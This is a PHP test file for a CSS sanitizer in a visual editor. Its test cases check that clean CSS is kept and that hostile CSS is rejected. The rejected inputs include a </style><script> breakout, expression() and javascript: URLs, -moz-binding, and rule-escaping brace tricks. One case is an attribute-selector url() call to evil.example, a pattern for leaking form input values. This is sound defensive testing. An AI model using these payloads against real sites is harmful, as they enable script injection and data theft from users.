<?php

declare( strict_types=1 );

use ArtisanPackUI\VisualEditor\Effects\CustomCssSanitizer;

it( 'normalises accepted Custom CSS', function ( string $css, string $expected ): void {
	expect( CustomCssSanitizer::sanitize( $css ) )->toBe( $expected );
} )->with( [
	'declarations'       => [ "  color: red;\n\tpadding: 1rem;  ", 'color: red; padding: 1rem;' ],
	'nested rule'        => [ "& > img {\n  border-radius: 50%;\n}", '& > img { border-radius: 50%; }' ],
	'pseudo class'       => [ '&:hover { opacity: 1; }', '&:hover { opacity: 1; }' ],
	'media query'        => [ '@media (max-width: 600px) { & { display: none; } }', '@media (max-width: 600px) { & { display: none; } }' ],
	'supports'           => [ '@supports (display: grid) { display: grid; }', '@supports (display: grid) { display: grid; }' ],
	'comment removed'    => [ 'color: red; /* note */ margin: 0;', 'color: red; margin: 0;' ],
	'string kept'        => [ 'content: "a  {  b";', 'content: "a  {  b";' ],
	'quoted url'         => [ 'background: url("https://example.com/a.png");', 'background: url("https://example.com/a.png");' ],
	'single-quoted url'  => [ "background: URL( 'a.png' );", "background: URL( 'a.png' );" ],
	'paren in string'    => [ 'content:"("', 'content:"("' ],
	'bracket in string'  => [ 'content:"[x"', 'content:"[x"' ],
	'brace in string'    => [ "content:'}'", "content:'}'" ],
	'nested functions'   => [ 'width: calc(100% - var(--gap, 1rem));', 'width: calc(100% - var(--gap, 1rem));' ],
	'attribute selector' => [ '& a[href^="http"] { color: red; }', '& a[href^="http"] { color: red; }' ],
	'url in a string'    => [ 'content: "url(x)";', 'content: "url(x)";' ],
] );

it( 'returns an empty string for empty input', function ( mixed $css ): void {
	expect( CustomCssSanitizer::sanitize( $css ) )->toBe( '' );
} )->with( [ 'null' => [ null ], 'blank' => [ "  \n " ], 'array' => [ [] ], 'nul and vertical tab' => [ "\0\x0B " ] ] );

it( 'treats only ASCII whitespace as blank', function (): void {
	expect( CustomCssSanitizer::sanitize( "\u{00A0}" ) )->toBe( "\u{00A0}" );
} );

it( 'rejects CSS that could escape the block or the style element', function ( string $css ): void {
	expect( CustomCssSanitizer::sanitize( $css ) )->toBeNull();
} )->with( [
	'closes the rule'       => [ 'color: red; } body { display: none' ],
	'leaves a brace open'   => [ '& img { color: red;' ],
	'style breakout'        => [ 'color: red; </style><script>alert(1)</script>' ],
	'backslash escape'      => [ 'content: "\\7d";' ],
	'unterminated string'   => [ 'content: "abc;' ],
	'newline in string'     => [ "content: \"a\nb\";" ],
	'unterminated comment'  => [ 'color: red; /* open' ],
	'import'                => [ '@import url(evil.css);' ],
	'font face'             => [ '@font-face { font-family: x; }' ],
	'keyframes'             => [ '@keyframes spin { to { rotate: 1turn; } }' ],
	'expression'            => [ 'width: expression(alert(1));' ],
	'javascript url'        => [ 'background: url(javascript:alert(1));' ],
	'binding'               => [ '-moz-binding: url(x.xml#y);' ],
	'control character'     => [ "color: red;\x01" ],
	'unquoted url'          => [ 'background: url(https://example.com/a.png);' ],
	'unquoted url, upper'   => [ 'background: URL(a.png);' ],
	'url with a comment'    => [ 'background: url(/* x */"a.png");' ],
	'url scope breakout'    => [ 'a:url({);} body{background:red} y{a:url(})' ],
	'url opens a string'    => [ "a:url(x'){}'" ],
	'open function'         => [ 'color: rgb(' ],
	'open bracket'          => [ 'a[href{}' ],
	'stray paren'           => [ 'a)' ],
	'stray bracket'         => [ 'a]' ],
	'paren holds a brace'   => [ 'a:( { ) }' ],
	'bracket holds a brace' => [ '& [x { ] }' ],
] );

it( 'keeps a value that only uses brackets, strings and comments correctly', function (): void {
	expect( CustomCssSanitizer::sanitize( '& :is(a, [data-x="]"]) { color: red; /* ) */ }' ) )
		->toBe( '& :is(a, [data-x="]"]) { color: red; }' );
} );

it( 'rejects resource-loading functions when URLs are disallowed', function ( string $css ): void {
	expect( CustomCssSanitizer::sanitize( $css, true ) )->not->toBeNull()
		->and( CustomCssSanitizer::sanitize( $css, false ) )->toBeNull();
} )->with( [
	'url'            => [ 'background: url("https://example.com/a.png");' ],
	'upper-case url' => [ 'background: URL("a.png");' ],
	'image-set'      => [ 'background: image-set("a.png" 1x);' ],
	'webkit set'     => [ 'background: -webkit-image-set("a.png" 1x);' ],
	'image'          => [ 'background: image("a.png");' ],
	'src'            => [ 'background: src("a.png");' ],
	'nested'         => [ '& input[value^="a"] { background: url("https://evil.example/a"); }' ],
] );

it( 'still accepts URL-free CSS, and URLs inside strings, when URLs are disallowed', function (): void {
	expect( CustomCssSanitizer::sanitize( 'color: red; content: "url(x)";', false ) )->toBe( 'color: red; content: "url(x)";' )
		->and( CustomCssSanitizer::sanitize( '/* url("x") */ color: red;', false ) )->toBe( 'color: red;' );
} );

it( 'rejects CSS over the length limit', function (): void {
	expect( CustomCssSanitizer::sanitize( str_repeat( 'a', CustomCssSanitizer::MAX_LENGTH + 1 ) ) )->toBeNull()
		->and( CustomCssSanitizer::sanitize( str_repeat( 'a', CustomCssSanitizer::MAX_LENGTH ) ) )->not->toBeNull();
} );
